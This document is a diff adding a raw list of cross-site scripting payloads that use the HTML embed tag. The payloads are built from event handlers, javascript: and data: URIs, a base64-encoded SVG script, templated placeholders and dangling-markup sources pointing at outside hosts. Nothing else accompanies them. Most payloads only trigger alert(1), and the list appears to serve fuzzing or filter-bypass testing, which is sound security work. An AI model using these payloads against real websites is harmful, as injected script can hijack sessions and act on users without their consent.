@@ -1,0 +1,59 @@
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
+<embed draggable="true" ondrag="alert(1)">test</embed>
+<embed draggable="true" ondragend="alert(1)">test</embed>
+<embed draggable="true" ondragenter="alert(1)">test</embed>
+<embed draggable="true" ondragleave="alert(1)">test</embed>
+<embed draggable="true" ondragstart="alert(1)">test</embed>
+<embed src=javascript:alert(1)>
+<embed id=x onfocus=alert(1) type=text/html>
+<embed id=x onfocusin=alert(1) type=text/html>
+<embed id=x tabindex=1 onactivate=alert(1)></embed>
+<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>
+<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>
+<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>
+<embed onafterscriptexecute=alert(1)><script>1</script>
+<embed onbeforecopy="alert(1)" contenteditable>test</embed>
+<embed onbeforecut="alert(1)" contenteditable>test</embed>
+<embed onbeforepaste="alert(1)" contenteditable>test</embed>
+<embed onbeforescriptexecute=alert(1)><script>1</script>
+<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>
+<embed onclick="alert(1)">test</embed>
+<embed oncontextmenu="alert(1)">test</embed>
+<embed oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<embed oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<embed ondblclick="alert(1)" autofocus tabindex=1>test</embed>
+<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>
+<embed onkeydown="alert(1)" contenteditable>test</embed>
+<embed onkeypress="alert(1)" contenteditable>test</embed>
+<embed onkeyup="alert(1)" contenteditable>test</embed>
+<embed onmousedown="alert(1)">test</embed>
+<embed onmouseenter="alert(1)">test</embed>
+<embed onmouseleave="alert(1)">test</embed>
+<embed onmousemove="alert(1)">test</embed>
+<embed onmouseout="alert(1)">test</embed>
+<embed onmouseover="alert(1)">test</embed>
+<embed onmouseup="alert(1)">test</embed>
+<embed onmousewheel=alert(1)>requires scrolling
+<embed onpaste="alert(1)" contenteditable>test</embed>
+<embed onpointerdown=alert(1)>XSS</embed>
+<embed onpointerenter=alert(1)>XSS</embed>
+<embed onpointerleave=alert(1)>XSS</embed>
+<embed onpointermove=alert(1)>XSS</embed>
+<embed onpointerout=alert(1)>XSS</embed>
+<embed onpointerover=alert(1)>XSS</embed>
+<embed onpointerrawupdate=alert(1)>XSS</embed>
+<embed onpointerup=alert(1)>XSS</embed>
+<embed src=/ onload=alert(1)>
+<embed src=1 onerror=alert(1) type=image/gif>
+<embed src="javascript:alert(1)">
+<embed src="//evil?
+<embed src=http://subdomain1.labs.net/dangling_markup/name.html name="
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
+<embed src="data:text/html;base64,%(base64)s">
+<embed code=%(scriptlet)s></embed>
+<embed code=javascript:javascript:alert(1);></embed>
+<embed src=%(jscript)s></embed>
+<embed type="image" src=%(scriptlet)s></embed>
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
